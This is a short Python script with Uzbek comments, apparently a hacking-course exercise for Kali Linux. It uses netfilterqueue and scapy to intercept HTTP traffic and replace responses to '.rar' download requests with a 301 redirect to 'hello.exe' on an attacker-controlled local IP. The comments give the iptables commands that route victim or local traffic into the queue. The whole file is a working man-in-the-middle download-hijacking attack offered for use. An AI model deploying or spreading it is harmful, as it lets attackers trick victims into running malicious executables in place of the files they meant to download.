#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # print("Bu yuborilgan", scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
                print(scapy_packet[scapy.Raw].load)

                try:
                    if ".rar" in scapy_packet[scapy.Raw].load.decode():
                        print("Bu so'rov:")
                        ack_list.append(scapy_packet[scapy.TCP].ack)
                        print(scapy_packet.show())
                except UnicodeDecodeError:
                    pass

        elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    # print(scapy_packet.show())
                    print("Bu javob:")
                    scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.211.87/new_papka/hello.exe\n\n"
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum
                    packet.set_payload(bytes(scapy_packet))
    # print(scapy_packet.show())
    packet.accept()
    # packet.drop()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# Kalida kiritish kerak bo’lgan kamanda

# iptables -I FORWARD -j NFQUEUE --queue-num 0   Boshqa komdan kelayotgan fileni ushlab qolish. Boshqa kom uchun shu komandani o’zi kifoya



# iptables –flush  Bu kamanda pasdagi va tepadagi kamandalarni o’chirish uchun

# Har ikkala komandani ketma ket kiritilishi kerak bu kamanda ham faillarni kalida ushlab qolish uchun farqi bu o’z kom..ingizda sinayotgan paytingiz kearak bu o’z kom..dagi faillarni ushlab qolishda foydalaniladi

#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0  
